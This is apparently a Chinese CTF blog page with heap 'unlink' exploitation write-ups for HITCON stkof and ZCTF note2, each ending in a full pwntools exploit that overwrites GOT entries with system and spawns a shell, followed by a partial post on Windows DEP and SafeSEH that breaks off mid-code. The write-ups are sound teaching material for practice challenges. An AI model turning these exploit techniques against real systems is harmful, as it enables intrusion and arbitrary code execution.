            <h1 id="Unlink实战"><a href="#Unlink实战" class="headerlink" title="Unlink实战"></a>Unlink实战</h1><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p>unlink技术前面已经学习过了，简单回忆一下其中的关键：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FD=P-&gt;fd </span><br><span class="line">BK=P-&gt;bk</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br><span class="line"></span><br><span class="line">fd = &amp;P<span class="number">-0x18</span></span><br><span class="line">bk = &amp;P<span class="number">-0x10</span></span><br><span class="line">P = &amp;P<span class="number">-0X18</span></span><br></pre></td></tr></table></figure>
<p>ida分析后可以看出程序主要有如下的几个功能：</p>
<ul>
<li>add，功能主要是输入一个size，分配相应的空间，并将指针存在bss段的</li>
<li>edit，指定index，输入size，修改相应index的内容</li>
<li>delete，指定index，free掉相应的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">n = atoll(&amp;s);</span><br><span class="line">ptr = ::s[v2];</span><br><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ptr += i;</span><br><span class="line">  n -= i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在edit函数中size由我们输出，没有检查大小，存在溢出漏洞，而bss段中有一数组专门存放我们chunk地址，确定攻击思路为unlink后改写系统函数的地址。</p>
<p>首先用gdb调试，简单分配两个chunk观察内存中的分布情况，设0x602140为head</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g0nle1paazj30ui046wgl.jpg" alt="image-20190301210035807"></p>
<p>很显然我们的第一个chunk在head+0x8的位置，但要注意，该程序没有进行setbuf操作，所以会在gets、printf时设置输入输出的缓冲区，为了避免产生影响，我们先分配一个chunk保证完成输入输出完成相应的初始化操作，紧接着再考虑攻击的问题。我们构造三个chunk，第一个保留，第二个用来溢出，我设置为0x30，第三个则要大一些（在smallbin的范围内）来触发unlink</p>
<p>我们在chunk2中伪造一个chunk。伪造的重点是chunk的size与溢出下一个chunk的pre_size是否相等、fd与bk指针能不能通过检查、是否将下一个chunk的pre_inuse位成功修改，具体的payload的构造如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">'A'</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
<p>之后我们free掉chunk3，此时由于chunk3的pre_inuse显示fake_chunk是free状态，会发生合并，触发unlink，导致我们原本chunk2在bss段位置p的内容变成了p-0x18的值，如图所示</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0o9ughp95j30ue04mdhf.jpg" alt="image-20190302110646389"></p>
<p>之后我们就可以通过edit chunk2的方式就可以从0x602138开始写入值了，注意由于我们写的位置是head+0x10-0x18，所以首先要填充0x10，既然要修改系统函数的地址那我们就必须要知道libc的base，我们可以通过puts函数来泄漏某个函数的地址进而计算。这样我们就有了构造下一步payload的思路，我们将chunk1的位置填为free_got，chunk2的位置填为使用过的任意函数（这里我选择了puts）的got，这样我们再次edit chunk1的时候就可以修改free_got的内容了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">8</span>  + <span class="string">'b'</span>*<span class="number">8</span> + p64(free_got) + p64(puts_got)</span><br></pre></td></tr></table></figure>
<p>利用edit将puts的plt地址填入free_got后，我们再次free chunk2实际上就是输出puts_got的值了，接下来就是简单的处理拿到libc的base后算出system的地址，然后再次edit chunk1，把free_got的值改为system。</p>
<p>最后，我们创建一个chunk4，在里面写入/bin/sh，再free掉就大功告成了</p>
<p>完整exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line"><span class="comment">#p = remote("192.168.211.126", 10000)</span></span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line">fd = head + <span class="number">0x10</span> - <span class="number">0x18</span></span><br><span class="line">bk = head + <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x50</span>) <span class="comment"># idx 1</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment"># idx 2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># idx 3</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment"># idx 4</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">'A'</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload1)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">8</span>  + <span class="string">'b'</span>*<span class="number">8</span> + p64(free_got) + p64(puts_got)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">payload3 = p64(puts_plt)</span><br><span class="line">edit(<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"puts_addr is %x\n"</span> %puts_addr)</span><br><span class="line">log.success(<span class="string">"libc_base is %x\n"</span> %libc_base)</span><br><span class="line">log.success(<span class="string">"system_addr is %x\n"</span> %system_addr)</span><br><span class="line"></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload4)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##2016 ZCTF note2</p>
<p>首先还是ida分析，整理之后发现有这几个功能：</p>
<ul>
<li>add，添加一个note和note的内容（会检查长度不能大于0x80，且会有一个bss段的ptr来存储地址）</li>
<li><p>show，展示指定index的note的内容</p>
</li>
<li><p>edit，修改指定index的note的内容</p>
</li>
<li><p>delete，删除指定index的note</p>
</li>
</ul>
<p>通过观察add我们发现了这个函数存在漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 size, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]    </span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; size - <span class="number">1</span> &gt; i; ++i )          <span class="comment">//a2是我们输入的size</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们输入的size为0是时，由于malloc的分配机制实际上会分配给我们0x20大小的空间，但是在这个读取数据的函数里size-1（注意size是无符号整数），也就变成了一个超级大的数，我们可以输入任意大小的数据了</p>
<p>拿我们就有思路了，我们可以malloc三个chunk，大小分别为0x80、0（实际上分配的是0x20，由于是小于fast_max，所以会进入fastbin，再次分配0时会从fastbin中取出）、0x80，然后拿chunk2去溢出chunk3，最终实现unlink，剩下的步骤就和上一题目一样了，具体过程不在赘述</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the length of the note content:(less than 128)"</span>)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,choice,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name:"</span>)</span><br><span class="line">p.sendline(<span class="string">'zsh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your address:"</span>)</span><br><span class="line">p.sendline(<span class="string">'sdust'</span>)</span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602120</span></span><br><span class="line">fd = head - <span class="number">0x18</span></span><br><span class="line">bk = head - <span class="number">0x10</span></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x8</span> + p64(<span class="number">0xa0</span>) + p64(fd) + p64(bk) + <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,payload1)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'b'</span>* <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content is '</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\n"</span>,drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"atoi_addr is %x\n"</span> %atoi_addr)</span><br><span class="line">log.success(<span class="string">"libc_base is %x\n"</span> %libc_base)</span><br><span class="line">log.success(<span class="string">"system_addr is %x\n"</span> %system_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/windows安全保护机制-DEP浅析/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/01/windows安全保护机制-DEP浅析/" itemprop="url">windows安全保护机制--DEP浅析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-01T17:23:43+08:00">
                2019-03-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="windows安全保护机制–DEP浅析"><a href="#windows安全保护机制–DEP浅析" class="headerlink" title="windows安全保护机制–DEP浅析"></a>windows安全保护机制–DEP浅析</h3><p>在温哥华Pwn2Own黑客大赛中，微软windows 7系统的ASLR技术和DEP技术都被选手成功绕过，但不可否认，ASLR和DEP确实是如微软IE小组经理所说，是“非常有效的保护机制”。</p>
<p>溢出攻击可谓是最常见的攻击手段之一，本质上溢出攻击都是利用了现代计算机体系结构上的设计缺陷，而重塑整个体系必然是不现实的，于是就有了各种各样的保护机制来弥补。<em>在Windows XP SP2之前，利用代码（exp）会在分配的内存页执行，不需要检查<a href="http://msdn.microsoft.com/en-us/library/aa366786%28VS.85%29.aspx" target="_blank" rel="noopener">内存保护常量</a>（Memory Protection Constants）。例如，如果使用指定分配权限为PAGE_READWRITE 的<a href="http://msdn.microsoft.com/en-us/library/aa366887.aspx" target="_blank" rel="noopener">VirtualAlloc ()</a>函数分配了内存页, 则仍然可以从该内存页执行代码。从 windows XP SP2 和 windows Server 2003 SP1 开始, 如果 CPU 支持执行禁用 (XD) （针对Intel CPU）或不可执行 (NX)（针对AMD CPU) 位，则任何从被标记为PAGE_READWRITE（例）的内存页执行代码的行为，都将触发 STATUS_ACCESS_VIOLATION (0xC0000005) 访问冲突异常。</em>而微软在windows xp sp2上开始提供的DEP，全称为数据执行保护，英文为Data Execution Prevention，则是一种更加有效的修补手段。</p>
<p>DEP根据其实现机制的不同分为硬件DEP和软件DEP，linux上的NX即为硬件DEP，而windows提供NX和SafeSEH（即为软件DEP）两种机制。一句话概括其功能：对于部分内存页不给予执行权限。</p>
<h2 id="硬件DEP"><a href="#硬件DEP" class="headerlink" title="硬件DEP"></a>硬件DEP</h2><p>硬件DEP的实现需要CPU的支持，其中AMD cpu提供了No-Execute Page-Protection（就是NX），而intel则是Execute Disable Bit（XD），可以在”我的电脑”-&gt;右键菜单”属性”-&gt;”高级”-&gt;”性能 - 设置”-&gt;”数据执行保护”或者是在C:\boot.ini来设置相关选项和查看cpu是否支持DEP，分为四种模式，一般计算机提供的是前两种：</p>
<ul>
<li>optout模式，除了指定的程序以外其他的程序都使用</li>
<li><p>optin模式，只为windows的程序和服务开启</p>
</li>
<li><p>AlwaysOn模式，所有进程强制开启，仅支持64位（不建议开启，某些dll并不能开启）</p>
</li>
<li>AlwaysOff模式，所有进程强制关闭</li>
</ul>
<p>硬件DEP的实现机制是操作系统通过设置内存页的NX/XD属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的页面表（Page Table）中加入一个特殊的标识位（NX/XD）来标识是否允许在该页上执行指令。当该标识位设置为0里表示这个页面允许执行指令，设置为1时表示该页面不允许执行指令。在64位的操作系统中也就是页表项的第63bit，而在32位的操作系统中略显复杂，因为32位的pte并没有多余的bit可以存放这个标识位，所以要利用PAE进行扩展，在没有PAE的情况下32位的系统不支持<em>硬件DEP</em></p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0mj4b63s0j31ci0u0tmy.jpg" alt="image-20190228225631962"></p>
<p>那它在底层到底是如何实现的呢？我们可与通过VirtualProtect()这个api函数来深入探索，这个函数的具体功能就是改变指定的内存页的属性，该函数的调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualProtect() --&gt; VirtualProtectEx() --&gt; ZwProtectVirtualMemory()</span><br></pre></td></tr></table></figure>
<p>接着通过sysenter进入内核，调用号为0x89，相应的调用是NtProtecVirtualMemory()，之后调用链如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtProtecVirtualMemory() --&gt; MiProtectVirtualMemory() --&gt; MiFlushTbAndCapture() --&gt; KeInterlockedSwapPte()</span><br></pre></td></tr></table></figure>
<p>注意，其中在MiProtectVirtualMemory()中，会计算出要改变其bit的内存页的PTE的地址，最后由KeInterlockedSwapPte()来改变指定PTE的属性。</p>
<p>来看看其汇编代码进行分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nt!KeInterlockedSwapPte:</span><br><span class="line">80541c08 53 push ebx</span><br><span class="line">80541c09 56 push esi</span><br><span class="line">80541c0a 8b5c2410 mov ebx,dword ptr [esp+10h] ;ebx为新的PTE的地址</span><br><span class="line">80541c0e 8b74240c mov esi,dword ptr [esp+0Ch] ;esi为旧的PTE地址</span><br><span class="line">80541c12 8b4b04 mov ecx,dword ptr [ebx+4] ;ecx为新PTE值高双字</span><br><span class="line">80541c15 8b1b mov ebx,dword ptr [ebx] ;ebx为PTE值低双字</span><br><span class="line">80541c17 8b5604 mov edx,dword ptr [esi+4] ;edx为旧PTE值高双字</span><br><span class="line">80541c1a 8b06 mov eax,dword ptr[esi] ;eax为旧PTE值低双字</span><br><span class="line">80541c1c 0fc70e cmpxchg8b qword ptr [esi];比较新旧是否相等，如果不想等用新的代替旧的</span><br></pre></td></tr></table></figure>
<h2 id="软件DEP"><a href="#软件DEP" class="headerlink" title="软件DEP"></a>软件DEP</h2><p>SafeSEH则是一种在软件层面实现的对SEH的保护机制，它需要操作系统和编译器的双重支持，在vs2013及以后的版本中会自动启用 /SafeSEH 链接选项来使用SafeSEH。也正是因为该项技术使得以往简单的覆盖异常处理句柄的漏洞利用几乎失效了</p>
<p>在加载PE文件时，SafeSEH将定位合法的SEH表的地址（如果该映像不支持SafeSEH的话则地址为0），然后是用共享内存中的一个随机数进行加密处理，程序中所有的异常处理函数的地址提取出来汇总放入SEH表，并将该表放入程序映像中，还会将将加密后的SEH函数表地址，IMAGE的开始地址，IMAGE的长度，合法SEH函数的个数，作为一条记录放入ntdll（ntdll模块是进行异常分发的模块）的加载模块数据内存中,每次调用异常处理函数时都会进行校验，只有二者一致才能够正常进行，该处理由RtlDispatchException() 开始，首先会经历两次检查，分别是：</p>
<ul>
<li>检查异常处理链是否在当前的栈中，不是则终止</li>
<li>检查异常处理函数的指针是否指向栈，是则终止</li>
</ul>
<p>通过两次检查后会调用RtlIsValidHandler() 来进行异常的有效性检查，08年的black hat给出了该函数的细节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">( handler )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in the loaded image)      <span class="comment">// 是否在loaded的空间内</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (image has <span class="built_in">set</span> the IMAGE_DLLCHARACTERISTICS_NO_SEH flag) <span class="comment">//是否设置了忽略异常</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;                  </span><br><span class="line">        <span class="keyword">if</span> (image has a SafeSEH table)       <span class="comment">// 是否含有SEH表</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)  <span class="comment">// 异常处理函数地址是否表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (image is a .NET assembly with the ILonl	y flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;                    </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is on non-executable page)   <span class="comment">// handler是否在不可执行页上</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> 